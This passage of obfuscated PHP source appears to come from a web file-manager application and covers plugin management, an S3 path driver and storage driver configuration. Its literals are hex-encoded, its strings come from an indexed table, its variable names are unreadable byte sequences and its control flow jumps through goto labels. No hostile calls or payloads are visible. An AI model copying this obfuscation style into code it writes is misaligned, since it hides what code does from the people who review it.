$ˆÊ´™â[497] => $¢–ÌÍº); return $this->where($áí¡ÛÆØ)->delete(); } protected function removeByTag($ˆ¢†ö¤ü, $Öçı ææ) { $¹Úúç«© =& $_SERVER[¯‘·½]; if (!$this->getByTagID($ˆ¢†ö¤ü, $Öçı ææ)) { return !1; } $Ÿ‹¡Ğ–Æ = array($¹Úúç«©[1797] => 0, $¹Úúç«©[561] => $Öçı ææ, $¹Úúç«©[498] => $¹Úúç«©[2129] . $ˆ¢†ö¤ü); return $this->where($Ÿ‹¡Ğ–Æ)->delete(); } protected function removeBySource($ÌÛ©², $Çú‘¾ú) { $‰•ƒ£º =& $_SERVER[¯‘·½]; if (!$ÌÛ©² || !$Çú‘¾ú) { return !1; } if (is_array($Çú‘¾ú)) { $Çú‘¾ú = array($‰•ƒ£º[7], $Çú‘¾ú); } $¸Úëü‡ğ = array($‰•ƒ£º[1797] => 0, $‰•ƒ£º[497] => $Çú‘¾ú, $‰•ƒ£º[561] => array($‰•ƒ£º[1110], 0), $‰•ƒ£º[498] => $‰•ƒ£º[2129] . $ÌÛ©²); return $this->where($¸Úëü‡ğ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\x70\x6c\165\x67\151\x6e\114\151\x73\164"; public $field = array("\156\141\x6d\x65", "\163\x74\x61\164\x75\x73", "\x72\145\147\151\x65\x73\164", "\x63\x6f\x6e\x66\151\147"); public function loadList($ã¡â²‰­ = false) { $–şäµ¸ø = array_to_keyvalue($this->listData(), $_SERVER[¯‘·½][32]); if ($ã¡â²‰­) { return $–şäµ¸ø[$ã¡â²‰­]; } return $–şäµ¸ø; } public function init() { $ÆÒ›º‡– =& $_SERVER[¯‘·½]; Hook::trigger($ÆÒ›º‡–[2130]); $¬²„Æšé = $this->loadPluginList(); foreach ($¬²„Æšé as $éïÁÖĞ => $şŠ°Ã§è) { $´ğ…öãÛ = $this->appAllow($éïÁÖĞ, $şŠ°Ã§è); if (!$´ğ…öãÛ) { continue; } foreach ($şŠ°Ã§è[$ÆÒ›º‡–[2131]] as $œ†ºş¤‡ => $Òñ– ’ø) { Hook::bind($œ†ºş¤‡, $Òñ– ’ø); } } Hook::trigger($ÆÒ›º‡–[2132]); Hook::trigger(ACTION); } public function appAllow($…´ÚÑ¬ò, $³éª‹ûŠ, $Äâ–Áî± = true) { $¤‰ÊÕœ =& $_SERVER[¯‘·½]; $ÖéŞ–¤Æ = PLUGIN_DIR . $…´ÚÑ¬ò . $¤‰ÊÕœ[2133]; if (!is_array($³éª‹ûŠ) || !is_array($³éª‹ûŠ[$¤‰ÊÕœ[2131]]) || $³éª‹ûŠ[$¤‰ÊÕœ[835]] != 1 || !is_file($ÖéŞ–¤Æ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$¤‰ÊÕœ[6]][$¤‰ÊÕœ[2134]] || !$GLOBALS[$¤‰ÊÕœ[6]][$¤‰ÊÕœ[2135]]) { return !0; } $¢Ÿ£Ÿ´ß = explode($¤‰ÊÕœ[50], strtolower($GLOBALS[$¤‰ÊÕœ[6]][$¤‰ÊÕœ[2135]])); return in_array(strtolower($…´ÚÑ¬ò), $¢Ÿ£Ÿ´ß) ? !1 : !0; } if ($Äâ–Áî± && !Action($¤‰ÊÕœ[2136])->checkAuth($…´ÚÑ¬ò)) { return !1; } return !0; } public function unInstall($äÉ†«˜) { $¹û¤á =& $_SERVER[¯‘·½]; $ùÖùÁÀÓ = $this->loadList($äÉ†«˜); if (file_exists(PLUGIN_DIR . $äÉ†«˜)) { Hook::apply($äÉ†«˜ . $¹û¤á[2137]); } $this->remove($ùÖùÁÀÓ[$¹û¤á[477]]); } public function changeStatus($ˆü··, $íÎ¡ø×’) { $¦ºÔÁ­÷ =& $_SERVER[¯‘·½]; $¶÷·Ããù = $this->loadList($ˆü··); if ($íÎ¡ø×’) { Hook::apply($ˆü·· . $¦ºÔÁ­÷[2138]); } $this->update($¶÷·Ããù[$¦ºÔÁ­÷[477]], array($¦ºÔÁ­÷[2139] => $íÎ¡ø×’)); } public function appRegist($Ä³¸¡õ¨, $µ›ÒÂó¯) { $’ŒÕôåŒ =& $_SERVER[¯‘·½]; $ã¶†óˆ‹ = $this->loadList($Ä³¸¡õ¨); if ($ã¶†óˆ‹) { $this->update($ã¶†óˆ‹[$’ŒÕôåŒ[477]], array($’ŒÕôåŒ[2131] => $µ›ÒÂó¯)); } else { $„ªæà“ª = array($’ŒÕôåŒ[32] => $Ä³¸¡õ¨, $’ŒÕôåŒ[2131] => $µ›ÒÂó¯, $’ŒÕôåŒ[835] => 0, $’ŒÕôåŒ[6] => $this->getConfigDefault($Ä³¸¡õ¨)); $this->insert($„ªæà“ª); } } public function getConfigDefault($©†ß¼ù) { $”š•«ñ¤ =& $_SERVER[¯‘·½]; $Ù·§ÃÍá = array(); $ğ€«©ç¡ = $this->getPackageJson($©†ß¼ù); if (!$ğ€«©ç¡ && is_array($ğ€«©ç¡[$”š•«ñ¤[2140]])) { return $Ù·§ÃÍá; } foreach ($ğ€«©ç¡[$”š•«ñ¤[2140]] as $áí´€ùÓ => $äã‚ı) { if (!isset($äã‚ı[$”š•«ñ¤[452]]) || isset($Ù·§ÃÍá[$áí´€ùÓ])) { continue; } $Ù·§ÃÍá[$áí´€ùÓ] = $äã‚ı[$”š•«ñ¤[452]]; } return $Ù·§ÃÍá; } public function getPackageJson($ÔâôáÊâ) { return Hook::apply($ÔâôáÊâ . $_SERVER[¯‘·½][2141]); } public function getConfig($ÌÂ¼°, $Œïğ‡ªÚ = false) { $şùÕÕ÷© =& $_SERVER[¯‘·½]; $Éı×¹úö = array(); $¨ÌÌ¿Ñ = $this->loadList($ÌÂ¼°); if ($¨ÌÌ¿Ñ && is_array($¨ÌÌ¿Ñ[$şùÕÕ÷©[6]])) { $Éı×¹úö = $¨ÌÌ¿Ñ[$şùÕÕ÷©[6]]; } if (!$Éı×¹úö || $Œïğ‡ªÚ) { $Éı×¹úö = $this->getConfigDefault($ÌÂ¼°); } return $Éı×¹úö; } public function setConfig($ú¶Ò¹úÓ, $‘¹€„œ¿ = false) { $âÒÎÏÊÒ =& $_SERVER[¯‘·½]; $íÍ˜ñï = $this->loadList($ú¶Ò¹úÓ); if (!$íÍ˜ñï) { return !1; } $•£ŒôÄª = $íÍ˜ñï[$âÒÎÏÊÒ[6]]; if ($‘¹€„œ¿ == !1) { $•£ŒôÄª = array(); $‘¹€„œ¿ = $this->getConfigDefault($ú¶Ò¹úÓ); } foreach ($‘¹€„œ¿ as $±Şà®¤Ó => $Îñ±¿Ì±) { $•£ŒôÄª[$±Şà®¤Ó] = is_string($Îñ±¿Ì±) ? trim($Îñ±¿Ì±) : $Îñ±¿Ì±; } $this->update($íÍ˜ñï[$âÒÎÏÊÒ[477]], array($âÒÎÏÊÒ[6] => $•£ŒôÄª)); } public function viewList() { $‰¶¸õ“ =& $_SERVER[¯‘·½]; $Í¬öï¯Å = $this->loadList(); $this->pluginScan($Í¬öï¯Å); $Í¬öï¯Å = $this->loadPluginList(); $È÷×îÂÑ = array(); foreach ($Í¬öï¯Å as $ëÙµˆ¨İ => $ıÛÀÇ¾Ü) { $¾ö†ÇŠ = $ıÛÀÇ¾Ü; unset($ıÛÀÇ¾Ü[$‰¶¸õ“[2131]], $ıÛÀÇ¾Ü[$‰¶¸õ“[6]]); $ÓÔæÙø = PLUGIN_DIR . $ıÛÀÇ¾Ü[$‰¶¸õ“[32]] . $‰¶¸õ“[2133]; if (!is_file($ÓÔæÙø)) { continue; } $Ãäµ½ÒÖ = Hook::apply($ıÛÀÇ¾Ü[$‰¶¸õ“[32]] . $‰¶¸õ“[2141]); if (!is_array($Ãäµ½ÒÖ)) { continue; } $È÷×îÂÑ[$ëÙµˆ¨İ] = array_merge($ıÛÀÇ¾Ü, $Ãäµ½ÒÖ); if ($¾ö†ÇŠ[$‰¶¸õ“[6]][$‰¶¸õ“[1718]] != $Ãäµ½ÒÖ[$‰¶¸õ“[1692]]) { Hook::apply($ıÛÀÇ¾Ü[$‰¶¸õ“[32]] . $‰¶¸õ“[2138]); $¾ö†ÇŠ[$‰¶¸õ“[6]][$‰¶¸õ“[1718]] = $Ãäµ½ÒÖ[$‰¶¸õ“[1692]]; $this->update($ıÛÀÇ¾Ü[$‰¶¸õ“[477]], array($‰¶¸õ“[6] => $¾ö†ÇŠ[$‰¶¸õ“[6]])); } } return $È÷×îÂÑ; } private function loadPluginList() { $·ÄõÁåş =& $_SERVER[¯‘·½]; $¹¾Ù’«õ = $this->loadList(); if (strtolower(MOD) == $·ÄõÁåş[2142]) { return $¹¾Ù’«õ; } $ùğüİ† = Hook::trigger($·ÄõÁåş[2143], $¹¾Ù’«õ); if ($¹¾Ù’«õ && !$ùğüİ†) { die; } return $ùğüİ† ? $ùğüİ† : $¹¾Ù’«õ; } private function pluginScan($Ö€’àŒÎ) { $ºöÖû’× =& $_SERVER[¯‘·½]; recursion_dir(PLUGIN_DIR, $Ê‚á¬İº, $ĞæŠî¸«, 0); foreach ($Ê‚á¬İº as $àòü¾Ü) { $œĞæºÂ— = get_path_this($àòü¾Ü); if (isset($Ö€’àŒÎ[$œĞæºÂ—]) || !file_exists($àòü¾Ü . $ºöÖû’×[2144]) || !file_exists($àòü¾Ü . $ºöÖû’×[2133])) { continue; } Hook::apply($œĞæºÂ— . $ºöÖû’×[2138]); } } } goto c¡…Ë ‹¾; C›ö¥‹êµ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($æªÍÜæã) { $¹şûÑÀ =& $_SERVER[¯‘·½]; parent::__construct($æªÍÜæã); $½„È­‹ = isset($æªÍÜæã[$¹şûÑÀ[259]]) && $æªÍÜæã[$¹şûÑÀ[259]] == $¹şûÑÀ[250] ? $¹şûÑÀ[250] : $¹şûÑÀ[316]; $this->setSignVersion($½„È­‹); } public function link($šÕãÄ‹Ö, $¢âëà²… = array()) { return parent::link($šÕãÄ‹Ö, $¢âëà²…); } public function fileOut($¢—Ê´ıã, $²åúèø¾ = false, $¯çÙ÷µ = false, $ Ÿ‹¼µ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¯‘·½][317])) { return parent::fileOutServer($¢—Ê´ıã, $²åúèø¾, $¯çÙ÷µ, $ Ÿ‹¼µ); } parent::fileOut($¢—Ê´ıã, $²åúèø¾, $¯çÙ÷µ, $ Ÿ‹¼µ); } public function fileOutImage($Û†™¤œÂ, $åûœ‘ú = 250) { if (strstr($this->endpoint, $_SERVER[¯‘·½][317])) { return parent::fileOutImageServer($Û†™¤œÂ, $åûœ‘ú); } parent::fileOutImage($Û†™¤œÂ, $åûœ‘ú); } } define($_SERVER[¯‘·½][318], 1); define($_SERVER[¯‘·½][319], 2); goto F»ù¢™µ—º; c¥Š•ø²Û†: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\x73\x74\157\162\141\x67\145\x4c\151\x73\x74"; public $field = array("\156\141\155\145", "\x73\x69\x7a\145\x4d\x61\170", "\163\x79\163\164\x65\155", "\x64\x65\146\141\165\x6c\x74", "\144\x72\x69\x76\x65\162", "\143\x6f\156\x66\x69\x67"); public function listData($Š´½­Ñ‹ = false, $ù€ÓÃœ = "\155\157\x64\x69\146\x79\124\151\155\x65", $“™’ÇŞ‘ = false) { $ğ³œ§ =& $_SERVER[¯‘·½]; $Ôò†…–ò = parent::listData($Š´½­Ñ‹, $ù€ÓÃœ, $“™’ÇŞ‘); if ($Š´½­Ñ‹) { return $Ôò†…–ò; } $Ê–§–ÙÕ = array(); if ($GLOBALS[$ğ³œ§[2344]]) { $Ê–§–ÙÕ = $this->ioSizeUseGet(array_to_keyvalue($Ôò†…–ò, $ğ³œ§[12], $ğ³œ§[477])); } foreach ($Ôò†…–ò as $¡šÎ¥¡¶ => $’âù•ĞÁ) { unset($Ôò†…–ò[$¡šÎ¥¡¶][$ğ³œ§[6]]); $Ôò†…–ò[$¡šÎ¥¡¶][$ğ³œ§[1995]] = isset($Ê–§–ÙÕ[$’âù•ĞÁ[$ğ³œ§[477]]]) ? $Ê–§–ÙÕ[$’âù•ĞÁ[$ğ³œ§[477]]] : 0; } return $Ôò†…–ò; } public function ioSizeUseGet($À°£Â¯´) { $£åéŠ =& $_SERVER[¯‘·½]; if (!$À°£Â¯´) { return array(); } $¡‘¡ê”ñ = $£åéŠ[2345] . implode($£åéŠ[50], $À°£Â¯´); $ÏÜã­©ì = Cache::get($¡‘¡ê”ñ); if ($ÏÜã­©ì) { return $ÏÜã­©ì; } $Ó¤Çõ§“ = array($£åéŠ[909] => $£åéŠ[477], $£åéŠ[2346] => $£åéŠ[79]); $Çâ‰õŞ¡ = array($£åéŠ[909] => array($£åéŠ[7], $À°£Â¯´)); $ÏÜã­©ì = Model($£åéŠ[877])->field($Ó¤Çõ§“)->where($Çâ‰õŞ¡)->group($£åéŠ[909])->select(); $ÏÜã­©ì = array_to_keyvalue($ÏÜã­©ì, $£åéŠ[477], $£åéŠ[79]); Cache::set($¡‘¡ê”ñ, $ÏÜã­©ì, 600); return $ÏÜã­©ì; } public function getConfig($›€ƒØàı) { $Ÿ¿û¡ÀŸ = parent::listData($›€ƒØàı); $µÀ©¹ªİ = _get($Ÿ¿û¡ÀŸ, $_SERVER[¯‘·½][6], array()); if ($µÀ©¹ªİ && !is_array($µÀ©¹ªİ)) { $µÀ©¹ªİ = json_decode($µÀ©¹ªİ, !0); } return $µÀ©¹ªİ; } public function update($ûóÒĞ», $­äóÁ›–) { $¹ëÄòğ± =& $_SERVER[¯‘·½]; $¯Ø§¸½Ó = $­äóÁ›–[$¹ëÄòğ±[32]]; $£‰ÒÌĞ = array_to_keyvalue(parent::listData(), $¹ëÄòğ±[32]); if (isset($£‰ÒÌĞ[$¯Ø§¸½Ó]) && $£‰ÒÌĞ[$¯Ø§¸½Ó][$¹ëÄòğ±[477]] != $ûóÒĞ») { return !1; } $this->checkPwd($ûóÒĞ», $­äóÁ›–); if (isset($­äóÁ›–[$¹ëÄòğ±[2347]]) && $­äóÁ›–[$¹ëÄòğ±[2347]] == $¹ëÄòğ±[91]) { $this->checkConfig($­äóÁ›–); } unset($­äóÁ›–[$¹ëÄòğ±[2347]]); $ØÈÖÇÇ  = parent::update($ûóÒĞ», $­äóÁ›–); if ($ØÈÖÇÇ  && $­äóÁ›–[$¹ëÄòğ±[37]]) { foreach ($£‰ÒÌĞ as $ûúìÍîò) { if ($ûúìÍîò[$¹ëÄòğ±[37]] && $ûúìÍîò[$¹ëÄòğ±[477]] != $ûóÒĞ») { parent::update($ûúìÍîò[$¹ëÄòğ±[477]], array($¹ëÄòğ±[37] => 0)); } } $this->updateBackup($ûóÒĞ», $£‰ÒÌĞ); } return $ØÈÖÇÇ ; } public function add($†²Â¢) { $´×ÑªÑØ =& $_SERVER[¯‘·½]; $¢ÉÙÂùÚ = array_to_keyvalue(parent::listData(), $´×ÑªÑØ[32]); if (isset($¢ÉÙÂùÚ[$†²Â¢[$´×ÑªÑØ[32]]])) { return !1; } $this->checkConfig($†²Â¢); $¡®‰ºŞ” = parent::insert($†²Â¢); if ($¡®‰ºŞ” && $†²Â¢[$´×ÑªÑØ[37]]) { foreach ($¢ÉÙÂùÚ as $ğñçÃÚ°) { if ($ğñçÃÚ°[$´×ÑªÑØ[37]]) { parent::update($ğñçÃÚ°[$´×ÑªÑØ[477]], array($´×ÑªÑØ[37] => 0)); } } $this->updateBackup($¡®‰ºŞ”, $¢ÉÙÂùÚ); } return $¡®‰ºŞ”; } public function updateBackup($ë£Š½¿î, $¦Ä€„Å¢) { $áÊéàù« =& $_SERVER[¯‘·½]; if ($ë£Š½¿î == $áÊéàù«[91]) { return; } $·€§ä¡ò = Model($áÊéàù«[833])->config(); $œÎöº¾” = $·€§ä¡ò[$áÊéàù«[837]]; if ($·€§ä¡ò[$áÊéàù«[1775]] != $áÊéàù«[91] || $œÎöº¾” == $ë£Š½¿î) { return; } if ($œÎöº¾” != $áÊéàù«[91]) { $ÒÈÄ±„ = array(); foreach ($¦Ä€„Å¢ as $â¾úã¯µ) { if ($ë£Š½¿î == $â¾úã¯µ[$áÊéàù«[477]]) { continue; } $ÒÈÄ±„[] = $â¾úã¯µ[$áÊéàù«[477]]; } if ($ÒÈÄ±„ && in_array($œÎöº¾”, $ÒÈÄ±„)) { return; } } $ç´ò×™ö = Model($áÊéàù«[856])->get($áÊéàù«[863]); $ç´ò×™ö = json_decode($ç´ò×™ö, !0); if (!$ç´ò×™ö) { return; } $ç´ò×™ö[$áÊéàù«[837]] = $ë£Š½¿î; Model($áÊéàù«[856])->set(array($áÊéàù«[863] => $ç´ò×™ö)); } public function checkPwd($„ìîŸÖè, &$ï¥ƒø—Ö) { $ëü„Ô¡· =& $_SERVER[¯‘·½]; if (empty($ï¥ƒø—Ö[$ëü„Ô¡·[6]])) { return; } $ó‰Úô…é = $ï¥ƒø—Ö[$ëü„Ô¡·[6]]; if (!is_array($ó‰Úô…é)) { $ó‰Úô…é = json_decode($ó‰Úô…é, !0); } $£´ò²ç = $ëü„Ô¡·[12]; $Á«ë˜¶’ = array($ëü„Ô¡·[2348], $ëü„Ô¡·[2349], $ëü„Ô¡·[985]); foreach ($Á«ë˜¶’ as $”°ö§Ûä) { if (isset($ó‰Úô…é[$”°ö§Ûä])) { $£´ò²ç = $”°ö§Ûä; break; } } if (!$£´ò²ç) { return; } $”´¢¾‰ª = $this->getConfig($„ìîŸÖè); $ÇÖçĞ• = $”´¢¾‰ª[$£´ò²ç]; $ºêÀ¸ù = $ó‰Úô…é[$£´ò²ç]; if ($ºêÀ¸ù == str_repeat($ëü„Ô¡·[223], strlen($ÇÖçĞ•))) { $ó‰Úô…é[$£´ò²ç] = $ÇÖçĞ•; $ï¥ƒø—Ö[$ëü„Ô¡·[6]] = json_encode($ó‰Úô…é); } else { if ($ºêÀ¸ù != $ÇÖçĞ•) { $ï¥ƒø—Ö[$ëü„Ô¡·[2347]] = $ëü„Ô¡·[91]; } } } public function checkConfig(&$‚ˆ¿ç»¶, $š´™»í› = false) { $ÄË”Ã =& $_SERVER[¯‘·½]; $Î“äí¬ñ = strtolower($‚ˆ¿ç»¶[$ÄË”Ã[98]]); $—ÁÜÎ„˜ = $‚ˆ¿ç»¶[$ÄË”Ã[6]]; if (!is_array($—ÁÜÎ„˜)) { $—ÁÜÎ„˜ = json_decode($—ÁÜÎ„˜, !0); } foreach ($—ÁÜÎ„˜ as $Ó·Ÿß† => $ßì°İÌ) { if (is_string($ßì°İÌ)) { $—ÁÜÎ„˜[$Ó·Ÿß†] = trim($ßì°İÌ); } } $—ÁÜÎ„˜[$ÄË”Ã[2350]] = rand_string(6); $ˆ½ÊóŸÔ = $GLOBALS[$ÄË”Ã[6]][$ÄË”Ã[92]][$ÄË”Ã[917]]; $ê¼ÙóŸ¥ = isset($ˆ½ÊóŸÔ[$Î“äí¬ñ]) ? $ˆ½ÊóŸÔ[$Î“äí¬ñ] : ucfirst($Î“äí¬ñ); $öÌŞåìÉ = $ÄË”Ã[77] . $ê¼ÙóŸ¥; if (!$ê¼ÙóŸ¥ || !class_exists($öÌŞåìÉ)) { if ($š´™»í›) { return LNG($ÄË”Ã[2351]); } write_log(array($ÄË”Ã[2352], $‚ˆ¿ç»¶, get_caller_info()), $ÄË”Ã[216]); show_json(LNG($ÄË”Ã[2351]), !1, $‚ˆ¿ç»¶); } $ÇÊÍöïõ = new $öÌŞåìÉ($—ÁÜÎ„˜); $™½™­’ = rtrim($—ÁÜÎ„˜[$ÄË”Ã[1286]], $ÄË”Ã[8]) . $ÄË”Ã[8]; if (in_array($Î“äí¬ñ, $ÇÊÍöïõ->objectDriver)) { try { if (!$ÇÊÍöïõ->isBucketCors() && !$ÇÊÍöïõ->setBucketCors()) { $ï©È‚à = LNG($ÄË”Ã[2353]); $ï©È‚à .= $ÄË”Ã[2354] . LNG($ÄË”Ã[2355]); } } catch (Exception $®ºÜª‰) { $ï©È‚à = $®ºÜª‰->getMessage(); } if (isset($ï©È‚à)) { return $this->_parseError($ï©È‚à, $Î“äí¬ñ, $š´™»í›); } if ($Î“äí¬ñ == $ÄË”Ã[68] && !$ÇÊÍöïõ->checkRegion()) { return $this->_parseError(LNG($ÄË”Ã[2356]), $Î“äí¬ñ, $š´™»í›); } } else { if ($Î“äí¬ñ == $ÄË”Ã[2357]) { if ($ÇÊÍöïõ->ftpPath) { $øƒß÷‰œ = trim($™½™­’, $ÄË”Ã[8]); if (stripos($øƒß÷‰œ, trim($ÇÊÍöïõ->ftpPath, $ÄË”Ã[8])) !== 0) { $™½™­’ = $ÇÊÍöïõ->ftpPath . $ÄË”Ã[8] . ($øƒß÷‰œ ? $øƒß÷‰œ . $ÄË”Ã[8] : $ÄË”Ã[12]); } } } } $ŸÌ™™‘÷ = $ÇÊÍöïõ->getPath($™½™­’ . $ÄË”Ã[1290]); try { if ($Î“äí¬ñ == $ÄË”Ã[109]) { $ÇÊÍöïõ->mkdir($™½™­’); } $ÔºŒÄ¶ú = $ÇÊÍöïõ->mkfile($ŸÌ™™‘÷); if (!$ÔºŒÄ¶ú) { $ï©È‚à = LNG($ÄË”Ã[2353]); } } catch (Exception $®ºÜª‰) { $ï©È‚à = $®ºÜª‰->getMessage(); } if (isset($ï©È‚à)) { return $this->_parseError($ï©È‚à, $Î“äí¬ñ, $š´™»í›); } $—ÁÜÎ„˜[$ÄË”Ã[1286]] = $™½™­’; $‚ˆ¿ç»¶[$ÄË”Ã[6]] = json_encode($—ÁÜÎ„˜); $‚ˆ¿ç»¶[$ÄË”Ã[98]] = $ê¼ÙóŸ¥; return !0; } private function _parseError($ˆ¶˜«Õ, $Àˆ˜î” , $ª»®’£» = false) { $éÉáóòæ =& $_SERVER[¯‘·½]; if ($Àˆ˜î”  == $éÉáóòæ[68] && stripos($ˆ¶˜«Õ, $éÉáóòæ[2358])) { $œÄ¬é”› = explode($éÉáóòæ[10], $ˆ¶˜«Õ); $ñØœ£Îò = isset($œÄ¬é”›[1]) ? $œÄ¬é”›[1] : $éÉáóòæ[12]; $¶°ÇÎ° = array($éÉáóòæ[2359] => LNG($éÉáóòæ[2360]), $éÉáóòæ[2361] => LNG($éÉáóòæ[2362])); if (isset($¶°ÇÎ°[$ñØœ£Îò])) { $ˆ¶˜«Õ = $¶°ÇÎ°[$ñØœ£Îò]; } } if (stripos($ˆ¶˜«Õ, $éÉáóòæ[2363]) === 0) { $˜†İÚı© = strpos($ˆ¶˜«Õ, $éÉáóòæ[178]); if ($˜†İÚı© === !1) { $˜†İÚı© = strpos($ˆ¶˜«Õ, $éÉáóòæ[4]); } if ($˜†İÚı© !== !1) { $ˆ¶˜«Õ = substr($ˆ¶˜«Õ, $˜†İÚı© + 1); } } $ˆ¶˜«Õ = LNG($éÉáóòæ[1293]) . $ˆ¶˜«Õ; if ($ª»®’£») { return $ˆ¶˜«Õ; } show_json($ˆ¶˜«Õ, !1); } public function driverListSystem() { $•¥˜…ú =& $_SERVER[¯‘·½]; $åÍöÊ¢ú = parent::listData(); $Ó¥Ìåè = array(); foreach ($åÍöÊ¢ú as $ç–ö§‹ê) { unset($ç–ö§‹ê[$•¥˜…ú[234]], $ç–ö§‹ê[$•¥˜…ú[88]]); if (!is_array($ç–ö§‹ê[$•¥˜…ú[6]])) { $ç–ö§‹ê[$•¥˜…ú[6]] = json_decode($ç–ö§‹ê[$•¥˜…ú[6]], !0); } $Ó¥Ìåè[] = $ç–ö§‹ê; } return $Ó¥Ìåè; } public function defaultDriver() { $¼ Üìµ =& $_SERVER[¯‘·½]; $Œ¶á‘ºĞ = parent::listData(); $ËÜ©ù± = array_filter_by_field($Œ¶á‘ºĞ, $¼ Üìµ[37], 1); $ËÜ©ù± = $ËÜ©ù±[0]; if (!$ËÜ©ù±) { return array(); } if (!is_array($ËÜ©ù±[$¼ Üìµ[6]])) { $ËÜ©ù±[$¼ Üìµ[6]] = json_decode($ËÜ©ù±[$¼ Üìµ[6]], !0); } return $ËÜ©ù±; } public function driverInfo($æÉÉÏº) { $óğãÏÅ¼ =& $_SERVER[¯‘·½]; $·ê¶Êâğ = array_to_keyvalue(parent::listData(), $óğãÏÅ¼[477]); if (!isset($·ê¶Êâğ[$æÉÉÏº])) { return !1; } $Ë… ÏÀé = $·ê¶Êâğ[$æÉÉÏº]; if (!is_array($Ë… ÏÀé[$óğãÏÅ¼[6]])) { $Ë… ÏÀé[$óğãÏÅ¼[6]] = json_decode($Ë… ÏÀé[$óğãÏÅ¼[6]], !0); } return $Ë… ÏÀé; } public function remove($¥»—”Ó™) { $this->removeShareItems($¥»—”Ó™); return parent::remove($¥»—”Ó™); } public function removeWithFile($íãÜˆ›, $Õ‚ò’îÃ, $¨ğÆğøõ, $¹Ò»èŞù = false) { $ÎŠ²ñ·À =& $_SERVER[¯‘·½]; $¦İ÷îÅĞ = array($ÎŠ²ñ·À[909] => $íãÜˆ›); $á¿Ğ¯µ = Model($ÎŠ²ñ·À[548])->where($¦İ÷îÅĞ)->count(); $†½„È• = Model($ÎŠ²ñ·À[548])->where($¦İ÷îÅĞ)->sum($ÎŠ²ñ·À[79]); $ğÔä¶êƒ = $Õ‚ò’îÃ . $ÎŠ²ñ·À[2364] . $íãÜˆ›; $ÅíÁ²† = LNG($Õ‚ò’îÃ == $ÎŠ²ñ·À[627] ? $ÎŠ²ñ·À[2365] : $ÎŠ²ñ·À[2366]); $ï‹ØÇ¼ = new TaskFileTransfer($ğÔä¶êƒ, $ÎŠ²ñ·À[216], $á¿Ğ¯µ, $ÅíÁ²† . $ÎŠ²ñ·À[464] . $¨ğÆğøõ[$ÎŠ²ñ·À[32]] . $ÎŠ²ñ·À[215] . $íãÜˆ›); $ï‹ØÇ¼->task[$ÎŠ²ñ·À[849]] = (double) $†½„È•; $Î˜óø“ø = KodIO::defaultDriver(); $é¥¥¢ = $Î˜óø“ø[$ÎŠ²ñ·À[477]]; $éöÉ©… = $éâ˜Š ¬ = $Æ Æ‡…æ = array(); $ÒöŞ°‚ = Model($ÎŠ²ñ·À[233])->where($¦İ÷îÅĞ)->field($ÎŠ²ñ·À[2367])->select(); foreach ($ÒöŞ°‚ as $ÑÆß„×Æ) { $”şÏÍ = $ÑÆß„×Æ[$ÎŠ²ñ·À[545]]; if ($¹Ò»èŞù) { $éâ˜Š ¬[] = $”şÏÍ; continue; } $µú”÷ùœ = $ÑÆß„×Æ[$ÎŠ²ñ·À[87]]; $›áºôÕ© = get_path_father($µú”÷ùœ); $Æ Æ‡…æ[] = $›áºôÕ©; $›áºôÕ© = str_replace("\173\x69\x6f\x3a{$íãÜˆ›}\x7d\57", "\x7b\x69\x6f\72{$é¥¥¢}\x7d\57", $›áºôÕ©); if (!IO::exist($µú”÷ùœ)) { $éöÉ©…[] = $”şÏÍ; $ï‹ØÇ¼->updateFileEnd($ÑÆß„×Æ[$ÎŠ²ñ·À[32]], $ÑÆß„×Æ[$ÎŠ²ñ·À[79]]); write_log($ÎŠ²ñ·À[2368] . $µú”÷ùœ, $ÎŠ²ñ·À[1939]); continue; } $Ñ’…ØÌğ = IO::move($µú”÷ùœ, $›áºôÕ©, REPEAT_RENAME); if (!$Ñ’…ØÌğ) { $éâ˜Š ¬[] = $”şÏÍ; $ï‹ØÇ¼->updateFileEnd($ÑÆß„×Æ[$ÎŠ²ñ·À[32]], $ÑÆß„×Æ[$ÎŠ²ñ·À[79]]); write_log($ÎŠ²ñ·À[2369] . $µú”÷ùœ, $ÎŠ²ñ·À[1939]); continue; } $¦İ÷îÅĞ = array($ÎŠ²ñ·À[545] => $”şÏÍ); $¾İ„—œ = array($ÎŠ²ñ·À[909] => $é¥¥¢, $ÎŠ²ñ·À[87] => $Ñ’…ØÌğ); Model($ÎŠ²ñ·À[233])->where($¦İ÷îÅĞ)->save($¾İ„—œ); } $¨İÈÂñõ = $ï‹ØÇ¼->task; if (!$¹Ò»èŞù) { Cache::set($ğÔä¶êƒ, $¨İÈÂñõ); } $ï‹ØÇ¼->end(); $éöÉ©… = array_unique($éöÉ©…); $éâ˜Š ¬ = array_unique($éâ˜Š ¬); if (!$¹Ò»èŞù && ($éöÉ©… || $éâ˜Š ¬)) { $•æ˜Ø‰ = array(); if ($éöÉ©…) { $•æ˜Ø‰[] = sprintf(LNG($ÎŠ²ñ·À[2370]), count($éöÉ©…)); } if ($éâ˜Š ¬) { $•æ˜Ø‰[] = sprintf(LNG($ÎŠ²ñ·À[2371]), count($éâ˜Š ¬)); } $•æ˜Ø‰ = sprintf(LNG($ÎŠ²ñ·À[2372]), implode($ÎŠ²ñ·À[2373], $•æ˜Ø‰)) . $ÎŠ²ñ·À[2374] . date($ÎŠ²ñ·À[2375]) . $ÎŠ²ñ·À[2376]; if ($Õ‚ò’îÃ == $ÎŠ²ñ·À[1251]) { $•æ˜Ø‰ .= $ÎŠ²ñ·À[2377] . LNG($ÎŠ²ñ·À[2378]); } else { $•æ˜Ø‰ = LNG($ÎŠ²ñ·À[2379]) . $ÎŠ²ñ·À[2380] . $•æ˜Ø‰; } $¨İÈÂñõ[$ÎŠ²ñ·À[1288]] = $•æ˜Ø‰; Cache::set($ğÔä¶êƒ, $¨İÈÂñõ); unset($¨ğÆğøõ[$ÎŠ²ñ·À[6]]); $ŒˆìÎª = array($ÎŠ²ñ·À[477] => $íãÜˆ›, $ÎŠ²ñ·À[2249] => $ÎŠ²ñ·À[627], $ÎŠ²ñ·À[32] => $¨ğÆğøõ[$ÎŠ²ñ·À[32]], $ÎŠ²ñ·À[98] => $¨ğÆğøõ[$ÎŠ²ñ·À[98]]); Hook::trigger($ÎŠ²ñ·À[1817], array($ÎŠ²ñ·À[1311] => $ŒˆìÎª, $ÎŠ²ñ·À[1321] => !0)); 